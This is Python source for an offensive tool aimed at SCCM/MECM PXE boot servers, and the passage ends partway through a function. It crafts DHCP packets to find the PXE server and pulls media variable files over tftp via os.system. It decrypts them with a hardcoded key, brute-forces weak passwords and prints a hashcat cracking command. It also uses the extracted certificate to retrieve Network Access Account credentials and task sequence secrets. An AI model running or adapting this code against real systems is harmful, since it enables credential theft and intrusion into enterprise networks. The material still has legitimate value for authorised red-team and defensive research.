#!/usr/bin/env python3
# PXEThiefUp

import binascii
import ipaddress
import socket
import platform
import configparser
import media_variable_file_cryptography as media_crypto
import lxml.etree as ET
import math
import requests
import zlib
import datetime
import os
import argparse

from os import walk,system
from requests_toolbelt import MultipartEncoder,MultipartDecoder
from scapy.all import *
from ipaddress import IPv4Network,IPv4Address
from rich.console import Console
from rich import print
from rich.table import Table
import pycdlib as pycd

# Scapy global variables
clientIPAddress = ""
clientMacAddress = ""

import win32crypt


# HTTP Configuration Options
# Configure proxying for debugging support
USING_PROXY = False 

# HTTPS and client certificate support
USING_TLS = False 
CERT_FILE = "output.crt"
KEY_FILE = "output-key.key"

# MECM Task Sequence Config Options
# The beginning of the DP URL as read from settings.ini; takes precedence over the value retrieved from the media file in decrypt_media_file(), if needed
SCCM_BASE_URL = ""

# Debug Config Options
DUMP_MPKEYINFORMATIONMEDIA_XML = True
DUMP_REPLYASSIGNMENTS_XML = True
DUMP_POLICIES = True

# SMS Variables
SMS_MEDIA_GUID = ""
SMS_TS_MEDIA_PFX = ""
BRANDING_TITLE = ""
SITECODE = ""
STANDALONE_MEDIA = ""

# Global Variables
BLANK_PASSWORDS_FOUND = False
MEDIATYPE = ""
PASSWORDREQUIRED = ""
UNATTENDED = "" 
VERBOSE = False
naa_credentials = []

WORKING_DIR = "loot"

## Crypto Functions
## ------------------
def generateSignedData(data,cryptoProv):
    #SHA1 hash algorithm
    sha1hash = cryptoProv.CryptCreateHash(32772,None)
    sha1hash.CryptHashData(data)

    #Call CryptSignHash with AT_KEYEXCHANGE, CRYPT_NOHASHOID
    out = sha1hash.CryptSignHash(1,1)

    return binascii.hexlify(out).decode()

def generateClientTokenSignature(data,cryptoProv):
    #SHA256 hash algorithm
    sha256hash = cryptoProv.CryptCreateHash(32780,None)
    sha256hash.CryptHashData(data)

    #Call CryptSignHash with AT_KEYEXCHANGE, CRYPT_NOHASHOID
    out = sha256hash.CryptSignHash(1,1)

    return binascii.hexlify(out).decode()

def deobfuscate_credential_string(credential_string):
    #print(credential_string)
    key_data = binascii.unhexlify(credential_string[8:88])
    encrypted_data = binascii.unhexlify(credential_string[128:])

    key = media_crypto.aes_des_key_derivation(key_data)
    last_16 = math.floor(len(encrypted_data)/8)*8
    return media_crypto._3des_decrypt(encrypted_data[:last_16],key[:24])

def decrypt_file(path, password):
    # Decrypt encryted file type using the password provided
    # password must be already encoded to utf-16-le
    global PASSWORD
    encrypted_file = media_crypto.read_media_variable_file(path)
    try:
        key = media_crypto.aes_des_key_derivation(password)
        last_16 = math.floor(len(encrypted_file)/16)*16
        decrypted_file = media_crypto.aes128_decrypt(encrypted_file[:last_16],key[:16])
        decrypted_file =  decrypted_file[:decrypted_file.rfind('\x00')]
        wf_decrypted_ts = "".join(c for c in decrypted_file if c.isprintable())
        return True, wf_decrypted_ts
    except:
        return False, None

def decrypt_media_file(path, password):
    # print(f"{password} {path}")
    password_is_string = True
    if type(password) != str:
        password_is_string = False

    if (VERBOSE):
        print_nice("Media variables file to decrypt: " + path, "INFO")
    if (password_is_string):
        if (VERBOSE):
            print_nice(f"Password provided: {password}", "INFO")
        formatted_password = password.encode("utf-16-le")
    else:
        if (VERBOSE):
            print_nice(f"Password provided: 0x{password.hex()}", "INFO")
        formatted_password = password

    response, decrypt_media_file = decrypt_file(path, formatted_password)
    if (response == True):
        print_nice("Successfully decrypted media variables file", "SUCCESS")
        return decrypt_media_file
    else:
        print_nice("Failed to decrypt media variables file.", "ERROR")
        print_nice(f"Password provided: {password}", "INFO")
        print_nice("Generating Hashcat hash for cracking", "INFO")
        generate_hashcat(path)
        sys.exit(-1)

## File I/O Functions
## ------------------
def write_to_file(path, filename, contents, type="xml"):
    if type == "xml":
        filename = filename + ".xml"
        f = open(path + "/" + filename, "w")
    elif type == "binary":
        f = open(path + "/" + filename, "wb")
    else:
        filename = filename + "." + type
        f = open(path + "/" + filename, "w")
    f.write(contents)
    f.close()

def scan_for_files(path):
    f = []
    for (dirpath, dirnames, filenames) in walk(path):
        f.extend(filenames)
        break

    for file in f:
        if file.endswith(".iso"):
            print_nice(f"Found ISO file: {file}", "INFO")
            variables, policy, password, variables_loot_path, policy_loot_path = search_through_iso(str(path + "\\" + file))
            if (variables and policy):
                #print("[+] Found both variables and policy files in the ISO")
                return variables_loot_path, policy_loot_path
            elif (variables):
                #print("[+] Found variables file in the ISO")
                return variables_loot_path, None
    
    variables_file = None
    policy_file = None

    for file in f:
        if file.endswith(".dat"):
            if "variables" in file.lower():
                variables_file = os.path.abspath(path + "\\" + file)
        if file.endswith(".xml"):
            if "policy" in file.lower():
                policy_file = os.path.abspath(path + "\\" + file)

    return variables_file, policy_file

def search_through_iso(isoPath):
    global MEDIATYPE
    global PASSWORDREQUIRED
    global UNATTENDED

    variables = None
    policy = None
    password = None
    variables_loot_path = None
    policy_loot_path = None

    ISOLOOT = WORKING_DIR + "/iso_extracted"
    if not os.path.exists(ISOLOOT):
        os.makedirs(ISOLOOT)

    isoName = isoPath.split("\\")[-1]
    abso_path = os.path.abspath(isoPath)
    #print(f"[+] Searching through ISO: {abso_path}")
    iso = pycd.PyCdlib()
    iso.open(abso_path)

    for dirname, dirlist, filelist in iso.walk(udf_path='/SMS/data'):
        # print(f"[+] Found files: {filelist}")
        variables_file = io.BytesIO()
        policy_file = io.BytesIO()
        bootstrap_file = io.BytesIO()
        policy_data = None
        variables_data = None
        bootstrap_data = None

        for file in filelist:
            if file.endswith(".ini"):
                if "bootstrap" in file.lower():
                    iso.get_file_from_iso_fp(bootstrap_file, udf_path=('/SMS/data/' + file))
                    bootstrap_data = bootstrap_file.getvalue()
                    write_to_file(ISOLOOT, isoName + "_" + file, bootstrap_data, "binary")
            if file.endswith(".xml"):
                if "policy" in file.lower():
                    #print(f"[+] Found Policy file")
                    iso.get_file_from_iso_fp(policy_file, udf_path=('/SMS/data/' + file))
                    policy_data = policy_file.getvalue()
                    write_to_file(ISOLOOT, isoName + "_" + file, policy_data, "binary")

            if file.endswith(".dat"):
                if "variables" in file.lower():
                    pathForFile = '/SMS/data/' + file
                    #print(f"[+] Found Variables file")
                    iso.get_file_from_iso_fp(variables_file, udf_path=pathForFile)
                    variables_data = variables_file.getvalue()
                    write_to_file(ISOLOOT, isoName + "_" + file, variables_data, "binary")
                    
    iso_extracts = []
    for (dirpath, dirnames, filenames) in walk(ISOLOOT):
        iso_extracts.extend(filenames)
        break

    if (bootstrap_data is not None):
        for file in iso_extracts:
            if "bootstrap" in file.lower():
                parse_bootstrap_ini(ISOLOOT + "/" + file)
            elif "variables" in file.lower():
                variables_loot_path = os.path.abspath(ISOLOOT + "/" + file)
            elif "policy" in file.lower():
                policy_loot_path = os.path.abspath(ISOLOOT + "/" + file)
        

        if (MEDIATYPE == "FullMedia"):
            # Both Variables and Policy files are present
            policy = True
            variables = True
        else:
            # Only Variables
            variables = True
        
        if (PASSWORDREQUIRED == "false"):
            # Default Password in use
            password = False
        else:
            # Password is required
            password = True

    return variables, policy, password, variables_loot_path, policy_loot_path

def parse_bootstrap_ini(bootstrap_data):
    global MEDIATYPE
    global PASSWORDREQUIRED
    global UNATTENDED
    # Parse the TSMBootstrap.ini file
    config = configparser.ConfigParser()
    config.read(bootstrap_data)
    MEDIATYPE = (config['MediaInfo']['MediaType'])
    PASSWORDREQUIRED = (config['MediaInfo']['PasswordRequired'])
    UNATTENDED = (config['MediaInfo']['Unattended'])

## Helper Function
## ------------------

def print_nice(data, type = "INFO"):
    if (type == "ERROR"):
        print("[red][!][red] " + data)
    elif (type == "INFO"):
        print("[yellow][?][yellow] " + data)
    elif (type == "SUCCESS"):
        print("[green][+][green] " + data)
    else:
        print("[*] " + data)

def print_information_table():
    table = Table(title="Information Found")
    table.add_column("Misconfiguration", justify="left", no_wrap=True)
    table.add_column("Details", justify="left", no_wrap=True)

    table.add_row("Password", PASSWORD)
    if (SCCM_BASE_URL != ""):
        table.add_row("Management Point", SCCM_BASE_URL)

    if (STANDALONE_MEDIA != ""):
        table.add_row("Standalone Media", STANDALONE_MEDIA)

    if (MEDIATYPE != ""):
        table.add_row("Media Type", MEDIATYPE)
        table.add_row("Password Required", PASSWORDREQUIRED)
        table.add_row("Unattended", UNATTENDED)
        
    console = Console()
    console.print(table)

def print_naa_credentials_table():
    table = Table(title="NAA Credentials")
    table.add_column("Username", justify="center", no_wrap=True)
    table.add_column("Password", justify="center", no_wrap=True)
    for credential in naa_credentials:
        table.add_row(credential[0], credential[1])
    console = Console()
    console.print(table)

def extract_key_information_from_variables(input):
    global SMS_MEDIA_GUID
    global BRANDING_TITLE
    global SITECODE
    global STANDALONE_MEDIA
    global WORKING_DIR
    global SCCM_BASE_URL

    root = ET.fromstring(input.encode("utf-16-le"))
    SMS_MEDIA_GUID = root.find('.//var[@name="_SMSMediaGuid"]').text 
    BRANDING_TITLE = root.find('.//var[@name="_SMSTSBrandingTitle"]').text
    SITECODE = root.find('.//var[@name="_SMSTSSiteCode"]').text
    STANDALONE_MEDIA = root.find('.//var[@name="_SMSTSStandAloneMedia"]').text
    try:
        SMSTSMP = root.find('.//var[@name="SMSTSMP"]')
    except:
        pass
    try:
        SMSTSLocationMPs = root.find('.//var[@name="SMSTSLocationMPs"]')
    except:
        pass

    if SMSTSMP is not None:
        SCCM_BASE_URL = SMSTSMP.text
    elif SMSTSLocationMPs is not None:
        SCCM_BASE_URL = SMSTSLocationMPs.text

    # print(f"Management Point: {SCCM_BASE_URL}")
    # print(f"Media GUID: {SMS_MEDIA_GUID}")
    # print(f"Branding Title: {BRANDING_TITLE}")
    # print(f"Sitecode: {SITECODE}")
    # print(f"Standalone Media: {STANDALONE_MEDIA}")

    WORKING_DIR = "loot/" + SITECODE + "_" + BRANDING_TITLE + "_" + SMS_MEDIA_GUID
    if not os.path.exists(WORKING_DIR):
        os.makedirs(WORKING_DIR)
    if not os.path.exists(WORKING_DIR + "/policies"):
        os.makedirs(WORKING_DIR + "/policies")

def test_default_weak_passwords_on_media(path):
    blankPassword = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
    passwords = {
        "1234",
        "123456",
        "12345678",
        "123456789",
        "password",
        "password1",
        "password123",
        "admin",
        "administrator",
        "root",
        "letmein",
        "qwerty",
        "abc123",
        "welcome",
        "Welcome1",
        "god",
        "love",
        "P@ssw0rd",
        "P@ssword",
        "P@ssw0rd1",
        "P@ssword1",
    }

    response, decrypt_media_file = decrypt_file(path, blankPassword)
    if (response == True):
        print_nice("Successfully decrypted media variables file with default password", "SUCCESS")
        write_to_file(WORKING_DIR, "variables_decrypted", decrypt_media_file)
        return True, decrypt_media_file, blankPassword

    for password in passwords:
        response, decrypt_media_file = decrypt_file(path, password)
        if (response == True):
            print_nice(f"Successfully decrypted media variables file with password: {password}", "SUCCESS")
            write_to_file(WORKING_DIR, "variables_decrypted", decrypt_media_file)
            return True, decrypt_media_file, password

    print_nice("Failed to decrypt media variables file with blank or default passwords", "ERROR")
    return False, None, None

def generate_hashcat(input):
    hash = (f"$sccm$aes128${media_crypto.read_media_variable_file_header(input).hex()}")
    print_nice(f"[yellow]Hashcat hash[white]: \n{hash}")
    print_nice(f"[yellow]Hashcat mode[white]: 19850 (requires https://github.com/The-Viper-One/hashcat-6.2.6-SCCM)")
    print_nice(f"[yellow]Command[white]: \nhashcat -m 19850 -a 0 '{hash}' '..\\rockyou(1).txt'")

def validate_ip_or_resolve_hostname(input):
    try:
        # Try and see if the IP address is valid
        ipaddress.ip_address(input)
        ip_address = input
    except:
        try:
            # Try and resolve the Hostname on the network
            ip_address = socket.gethostbyname(input.strip())
        except:
            print_nice(input + " does not appear to be a valid hostname or IP address (or DNS does not resolve)", "ERROR")
            sys.exit(0)
    return ip_address

def print_interface_table():
    print("[!] Set the interface to be used by scapy in manual_interface_selection_by_id in the settings.ini file")
    print()
    print("Available Interfaces:")
    print(conf.ifaces)

def get_config_section(section_name):
    config = configparser.ConfigParser(allow_no_value=True)
    config.read('settings.ini')
    return config[section_name]

def configure_scapy_networking(ip_address):
    # If user has provided a target IP address, use it to determine interface to send traffic out of
    if ip_address is not None:
        ip_address = validate_ip_or_resolve_hostname(ip_address)

        route_info = conf.route.route(ip_address,verbose=0)
        interface_ip = route_info[1]

        if interface_ip != "0.0.0.0":
            conf.iface = route_info[0]
        else:
            print_nice(f"No route found to target host {ip_address}", "ERROR")
            sys.exit(-1)
    else:
        #Automatically attempt sane interface configuration
        config = configparser.ConfigParser(allow_no_value=True)
        config.read('settings.ini')
        scapy_config = config["SCAPY SETTINGS"]
        
        if scapy_config.get("manual_interface_selection_by_id"):
            try:
                manual_selection_mode_id = scapy_config.getint("manual_interface_selection_by_id")
            except:
                print_nice("Invalid value set for 'manual_interface_selection_by_id' in 'settings.ini' file. Please specify an integer associated with the desired interface, or leave the field blank for automatic interface selection", "ERROR")
                sys.exit(-1)
        else:
            manual_selection_mode_id = None

        if manual_selection_mode_id:
            print_nice(f"Attemting to use Interface ID {str(manual_selection_mode_id)} provided in setttings.ini")
            conf.iface = conf.ifaces.dev_from_index(manual_selection_mode_id)
        else:
            print_nice("Attemting automatic interface detection")
            selection_mode = scapy_config.getint("automatic_interface_selection_mode")
            # 1 - Use interface that can reach default GW as output interface, 2 - First interface with no autoconfigure or localhost IP address 
            try_next_mode = False
            if selection_mode == 1:

                default_gw = conf.route.route("0.0.0.0",verbose=0)
                default_gw_ip = conf.route.route("0.0.0.0",verbose=0)[2]
                
                #If there is a default gw found, set scapy to use that interface
                if default_gw_ip != '0.0.0.0':
                    conf.iface = default_gw[0]
                else: 
                    try_next_mode = True

            if selection_mode == 2 or try_next_mode:

                loopback_range = IPv4Network('127.0.0.0/8')
                autoconfigure_ranges = IPv4Network('169.254.0.0/16')

                interfaces = scapy.interfaces.get_working_ifaces()
                for interface in interfaces:
                    
                    #Read IP from interface
                    ip =  get_if_raw_addr(interface)    
                    if ip:
                        ip = IPv4Address(inet_ntop(socket.AF_INET, ip))
                    else: 
                        continue

                    #If it is a valid IP and is not a loopback or autoconfigure IP, use this interface
                    if ip and not (ip in loopback_range) and not (ip in autoconfigure_ranges):
                        conf.iface = interface
                        break
                    
                #Implement check on conf.iface value
    
    global clientIPAddress
    global clientMacAddress

    clientIPAddress = get_if_addr(conf.iface)
    clientMacAddress = get_if_hwaddr(conf.iface)

    bind_layers(UDP,BOOTP,dport=4011,sport=68) # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
    bind_layers(UDP,BOOTP,dport=68,sport=4011)
    print_nice(f"Using interface: [white]{conf.iface} - {conf.iface.description}")

def find_pxe_server():
    # Find PXE server with DHCP discover packet with the right options set 
    print_nice("Sending initial DHCP Discover to find PXE boot server...")
    
    # DHCP Discover packet is from IP 0.0.0.0, with destination 255.255.255.255 and ff:ff:ff:ff:ff:ff destination MAC address. 
    # Need to ask for DHCP options 66 and 67 to find PXE servers
    pkt = Ether(
        dst="ff:ff:ff:ff:ff:ff"
        )/IP(
        src="0.0.0.0", 
        dst="255.255.255.255"
        )/UDP(
            sport=68, 
            dport=67
        )/BOOTP(
            chaddr=clientMacAddress
            )/DHCP(
                options=[(
                    "message-type", 
                    "discover"
                ),
            (
            'param_req_list',
            [1,3,6,66,67]
        ),
        "end"]
    )

    """ TODO: 
        - Add a timeout option
    """

    # Make scapy ignore IP address when checking for responses (needed because we sent to a broadcast address)
    conf.checkIPaddr = False 

    # This could fail if multiple DHCP servers exist in the environment and only some of them offer the PXE server in their response
    # This is out loop to check if we have 
    ans = srp1(pkt) 
    conf.checkIPaddr = True

    if ans:
        packet = ans

        # Pull out DHCP offer from received answer packet
        dhcp_options = packet[1][DHCP].options
        
        tftp_server = next(
            (opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "tftp_server_name"),
            None
        )
        
        if tftp_server:
            # Come back to and review the rstrip and update this potentially?
            # DHCP option 66 is TFTP Server Name
            tftp_server = tftp_server.rstrip(b"\0").decode("utf-8") 

            boot_file = next(
                (opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "boot-file-name"),
                None
            )

            if boot_file:
                # Come back to and review the rstrip and update this potentially?
                # DHCP option 67 is Bootfile Name
                boot_file = boot_file.rstrip(b"\0").decode("utf-8")
    else:
        print("[-] No DHCP responses received with PXE boot options") 
        sys.exit(-1)
    
    print_nice(f"Received DHCP offer from PXE server: {packet[1][IP].src}")
    
    # Catch for nonetype dhcp response
    if tftp_server is None:
        print_nice("No TFTP server name found in the DHCP offer packet", "ERROR")
        sys.exit(-1)

    # Need to dig into this more because surely this can be done easier?
    tftp_server = validate_ip_or_resolve_hostname(tftp_server.strip())

    print_nice("PXE Server IP: " + tftp_server)
    print_nice("Boot File Location: " + boot_file)

    return tftp_server

def get_variable_file_path(tftp_server):
    # Ask SCCM for location to download variable file. This is done with a DHCP Request packet
    print_nice("Asking ConfigMgr for location to download the media variables and BCD files...")

    # Media Variable file is generated by sending DHCP request packet to port 4011 on a PXE enabled DP. 
    # This contains DHCP options 60, 93, 97 and 250

    # Craft the Packet for requesting it
    pkt = IP(src=clientIPAddress,dst=tftp_server)/UDP(sport=68,dport=4011)/BOOTP(ciaddr=clientIPAddress,chaddr=clientMacAddress)/DHCP(options=[
        ("message-type", "request"),
        # 3c 80 81 82 83 84 85 86 87
        ('param_req_list', [
            60, 
            128, 
            129, 
            130, 
            131, 
            132, 
            133, 
            134, 
            135
        ]), 
        # x86 architecture
        ('pxe_client_architecture', b'\x00\x00'), 
        # x64 private option
        (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")),
        # x86 private option
        # (250,binascii.unhexlify("0d0208000e010101020006050400000006ff")),
        ('vendor_class_id', b'PXEClient'), 

        # Included by the client, but doesn't seem to be necessary in WDS PXE server configurations
        #('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), 
        "end"]
    )

    """
     sr return value: 
        ans, 
        unans/packetpair1,
        packetpair2 (i.e. PacketPairList)/sent packet,
        received packet/Layers(Ethernet,IP,UDP/TCP,BOOTP,DHCP)
    """
    ans = sr1(
        pkt, 
        timeout=10,
        iface=conf.iface,
        verbose=2,
        filter="udp port 4011 or udp port 68"
    ) 

    # TODO: Make sure received packets are DHCP packets before next bit of code
    encrypted_key = None
    if ans:
        packet = ans
        dhcp_options = packet[1][DHCP].options
    
        # Option 243 is the DHCP option for SCCM supply the Variable File Location
        # Does the received packet contain DHCP Option 243? DHCP option 243 is used by SCCM to send the variable file location
        for i in dhcp_options:
            print(i)
        
        # If BCD only then waiting for Approval
        ## Need to fix the catch for BCD only when the SCCM responds without a variables file
        option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243) 
        
        if variables_file:
            # First byte of the option data determines the type of data that follows
            # Second byte of the option data is the length of data that follows
            # TLV Option Output
            packet_type = variables_file[0]
            data_length = variables_file[1]

            # If the first byte is set to 1, this is the location of the encrypted media file on the TFTP server (variables.dat)
            if packet_type == 1:
                # Skip first two bytes of option and copy the file name by data_length
                variables_file = variables_file[2:2+data_length]
                variables_file = variables_file.decode('utf-8')

            # If the first byte is set to 2, this is the encrypted key stream that is used to encrypt the media file. The location of the media file follows later in the option field
            elif packet_type == 2:
                # Skip first two bytes of option and copy the encrypted data by data_length
                encrypted_key = variables_file[2:2+data_length]
                
                # Get the index of data_length of the variables file name string in the option, and index of where the string begins
                string_length_index = 2 + data_length + 1
                beginning_of_string_index = 2 + data_length + 2

                # Read out string length
                string_length = variables_file[string_length_index]

                # Read out variables.dat file name and decode to utf-8 string
                variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length] 
                variables_file = variables_file.decode('utf-8')
            
            # DHCP option 252 is used by SCCM to send the BCD file location
            bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")  
        else:
            print("[-] No variable file location (DHCP option 243) found in the received packet when the PXE boot server was prompted for a download location") 
            sys.exit(-1)
    else:
        print_nice(f"No DHCP responses recieved from MECM server {tftp_server}", "ERROR")
        print_nice(f"This may indicate that the wrong IP address was provided or that there are firewall restrictions blocking DHCP packets to the required ports", "ERROR") 
        sys.exit(-1)
    
    print_nice(f"Variables File Location: {variables_file}")
    print_nice(f"BCD File Location: {bcd_file}")

    if encrypted_key:
        global BLANK_PASSWORDS_FOUND
        BLANK_PASSWORDS_FOUND = True

        print_nice("Blank password on PXE boot found!")
        return [
            variables_file,
            bcd_file,
            encrypted_key
        ]
    else:
        return [
            variables_file,
            bcd_file
        ]

def get_pxe_files(ip):
    # Target Selection and validation

    # If IP is supplied by the user
    if ip != None:
        print_nice(f"Targeting user-specified host: {ip}")
        # Target the specified host
        tftp_server_ip = validate_ip_or_resolve_hostname(ip)
    
    # If not, discover via DHCP
    else:
        print_nice("Discovering PXE Server through DHCP...")
        # Scan for PXE Server
        tftp_server_ip = find_pxe_server()
        print_nice(f"PXE Server found from DHCP at {tftp_server_ip}")

    # Use the resolved PXE Server to request it
    answer_array = get_variable_file_path(tftp_server_ip)

    # Variables.dat
    variables_file = answer_array[0]
    
    # Bootdisk
    bcd_file = answer_array[1]
    
    # If the BCD validated file contains a blank password, use it
    if BLANK_PASSWORDS_FOUND:
        encrypted_key = answer_array[2]

    tftp_download_string = ""

    # God I want to fix all of this code up, the fuck is this shit

    # TFTP works over UDP by having a client pick a random source port to send the request for a file from. The server then connects back to the client on this selected source port to transmit the selected data that is then acknowledged by the client. 
    # Full bidirectional comms is required between the server on port 69 and the selected ephemeral ports on the server and client in order for a transfer to complete successfully 
    if osName == "Windows":
        var_file_download_cmd = "tftp -i " + tftp_server_ip + " GET " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n"
        var_file_name = variables_file.split("\\")[-1]
        tftp_download_string = ("tftp -i " + tftp_server_ip + " GET " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n" +
        "tftp -i " + tftp_server_ip + " GET " + "\"" + bcd_file + "\"" + " " + "\"" + bcd_file.split("\\")[-1] + "\"")
    else:
        var_file_download_cmd = "tftp -m binary " + tftp_server_ip + " -c get " + "\"" + variables_file + "\"" + " " + "\"" + variables_file.split("\\")[-1] + "\"\n" 
        tftp_download_string = var_file_download_cmd + "tftp -m binary " + tftp_server_ip + " -c get " + "\"" + bcd_file + "\"" + " " + "\"" + bcd_file.split("\\")[-1] + "\""
        var_file_name = variables_file.split("\\")[-1]
        '''
        print("Or, if you have atftp installed: ")
        print("")
 
        tftp_download_string = ("atftp --option \"blksize 1428\" --verbose " + 
        tftp_server_ip + 
        " << _EOF_\n" + 
        "mode octet\n" + 
        "get " + variables_file + " " + variables_file.split("\\")[-1] + "\n" +
        "get " + bcd_file + " " + bcd_file.split("\\")[-1] + "\n" +
        "quit\n" +
        "_EOF_\n" )
        '''

    # This should only be printed if we have a verbose output or the blank password cannot be exploited.
    print_nice("Use this command to grab the files: ")
    print(tftp_download_string)
    
    if BLANK_PASSWORDS_FOUND:
        print("[!] Attempting automatic exploitation. Note that this will require the default tftp client to be installed (on Windows, this can be found under Windows Features), and this will be run with os.system")
        os.system(var_file_download_cmd)
        use_encrypted_key(encrypted_key,var_file_name)
    else:
        # Lol, print this why not?
        print("[+] User configured password detected for task sequence media. Attempts can be made to crack this password using the relevant hashcat module")

def process_pxe_bootable_and_prestaged_media(media_xml):
    # Parse media file in order to pull out PFX password and PFX bytes
    # Certificate used to securely communicate to the SCCM/MCM server
    root = ET.fromstring(media_xml.encode("utf-16-le"))
    smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text 
    smsTSMediaPFX = root.find('.//var[@name="_SMSTSMediaPFX"]').text

    global SCCM_BASE_URL
    if SCCM_BASE_URL == "":
        if (VERBOSE):
            print_nice("Identifying Management Point URL from media variables (Subsequent requests may fail if DNS does not resolve!)", "INFO")
            #Partial Media - SMSTSLocationMPs
        
        SMSTSMP = root.find('.//var[@name="SMSTSMP"]')
        SMSTSLocationMPs = root.find('.//var[@name="SMSTSLocationMPs"]')

        if SMSTSMP is not None:
            SCCM_BASE_URL = SMSTSMP.text
        elif SMSTSLocationMPs is not None:
            SCCM_BASE_URL = SMSTSLocationMPs.text
    
    print_nice("Management Point set to: " + SCCM_BASE_URL, "INFO")
    dowload_and_decrypt_policies_using_certificate(smsMediaGuid,smsTSMediaPFX) 

def process_full_media(password, policy):
    # print(f"{password} {policy}")
    password_is_string = True
    if type(password) != str:
        password_is_string = False
    
    if (VERBOSE):
        print_nice("Policy file to decrypt: " + policy, "INFO")
    if (password_is_string):
        if (VERBOSE):
            print_nice(f"Password provided: {password}", "INFO")
        formatted_password = password.encode("utf-16-le")
    else:
        if (VERBOSE):
            print_nice(f"Password provided: 0x{password.hex()}", "INFO")
        formatted_password = password

    response, decrypt_policy_file = decrypt_file(policy, formatted_password)
    if (response == True):
        print_nice("Successfully Decrypted Policy file", "SUCCESS")
        write_to_file(WORKING_DIR, "policies", decrypt_policy_file)
        process_naa_xml(decrypt_policy_file)
        process_task_sequence_xml(decrypt_policy_file)
    else:
        print_nice("Failed to decrypt Policy file.", "ERROR")
        print_nice(f"Password provided: {password}", "INFO")
        sys.exit(-1)

def use_encrypted_key(encrypted_key, media_file_path):
    #ProxyDHCP Option 243
    length = encrypted_key[0]

    # Pull out 48 bytes that relate to the encrypted bytes in the DHCP response
    encrypted_bytes = encrypted_key[1:1+length]     
    
    # Isolate encrypted data bytes
    encrypted_bytes = encrypted_bytes[20:-12] 

    # Harcoded in tspxe.dll
    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' 

    # Derive key to decrypt key bytes in the DHCP response
    key = media_crypto.aes_des_key_derivation(key_data) 

    # 10 byte output, can be padded (appended) with 0s to get to 16 struct.unpack('10c',var_file_key)
    var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) 

    # Perform bit extension to help with key 
    LEADING_BIT_MASK =  b'\x80'
    new_key = bytearray()
    for byte in struct.unpack('10c',var_file_key):
        if (LEADING_BIT_MASK[0] & byte[0]) == 128:
            new_key = new_key + byte + b'\xFF'
        else:
            new_key = new_key + byte + b'\x00'

    # Decrypt the Media File an
    media_variables = decrypt_media_file(media_file_path, new_key)
    extract_key_information_from_variables(media_variables)
    
    # Again, verbose, not needed
    print("[!] Writing media variables to variables.xml")
    
    # Maybe this should be in a target folder instead?
    write_to_file(WORKING_DIR,"variables", media_variables)
    
    # Parse media file in order to pull out PFX password and PFX bytes
    root = ET.fromstring(media_variables.encode("utf-16-le"))
    smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text 
    smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
    smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
    filename = smsMediaSiteCode + "_" + smsMediaGuid +"_SMSTSMediaPFX.pfx"
    
    # Why did it even write this out, I don't think this is needed?
    print("[-] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
    # Target Folder instead?
    write_to_file(WORKING_DIR, filename, smsTSMediaPFX, "binary")

    if osName == "Windows":
        process_pxe_bootable_and_prestaged_media(media_variables)
    else:
        # Maybe I need to like, tag this later, IDK
        print("[!] This tool uses win32crypt to retrieve passwords from MECM, which is not available on non-Windows platforms")

def dowload_and_decrypt_policies_using_certificate(guid, cert_bytes):
    #Parse the downloaded task sequences and extract sensitive data if present
    smsMediaGuid = guid

    # CCMClientID header is equal to smsMediaGuid from the decrypted media file
    # Maybe chuck an exception catch here as well then?
    CCMClientID = smsMediaGuid
    smsTSMediaPFX = binascii.unhexlify(cert_bytes)
    
    # Import decrypted PFX and initialise Windows Crypto functions
    # CRYPT_USER_KEYSET
    certStore = win32crypt.PFXImportCertStore(
        smsTSMediaPFX, 
        smsMediaGuid[:31],
        4096
    ) 
    certEnum = certStore.CertEnumCertificatesInStore()
    certKeyContext = certEnum[0].CertGetCertificateContextProperty(2)

    cryptoProv = win32crypt.CryptAcquireContext(
        certKeyContext["ContainerName"],
        certKeyContext["ProvName"],
        certKeyContext["ProvType"],
        0
    )
    
    # Verbose output instead?
    if (VERBOSE):
        print('[+] Successfully Imported PFX File into Windows Certificate Store!')
    decryptPara = {}
    decryptPara["CertStores"]=[certStore]
    if (VERBOSE):
        print('[+] Generating Client Authentication headers using PFX File...')

    # Crypto Signiture for next messages
    data = CCMClientID.encode("utf-16-le") + b'\x00\x00'
    CCMClientIDSignature = generateSignedData(data,cryptoProv)
    #CCMClientIDSignature = str(generateClientTokenSignature(data,cryptoProv))
    if (VERBOSE):
        print("[+] CCMClientID Signature Generated")

    CCMClientTimestamp = datetime.datetime.now(datetime.UTC).replace(microsecond=0).isoformat()+'Z'
    data = CCMClientTimestamp.encode("utf-16-le") + b'\x00\x00'
    CCMClientTimestampSignature = generateSignedData(data,cryptoProv)
    #CCMClientTimestampSignature = str(generateClientTokenSignature(data,cryptoProv))
    if (VERBOSE):
        print("[+] CCMClientTimestamp Signature Generated")

    data = (CCMClientID + ';' + CCMClientTimestamp + "\0").encode("utf-16-le")
    clientTokenSignature = str(generateSignedData(data,cryptoProv))
    #clientTokenSignature = str(generateClientTokenSignature(data,cryptoProv))
    if (VERBOSE):
        print("[+] ClientToken Signature Generated")

    # Add a pre-flight check for the HTTP requests
    validate_ip_or_resolve_hostname(SCCM_BASE_URL)

    try:
        naaConfigs, tsConfigs, colsettings = make_all_http_requests_and_retrieve_sensitive_policies(
            CCMClientID,
            CCMClientIDSignature,
            CCMClientTimestamp,
            CCMClientTimestampSignature,
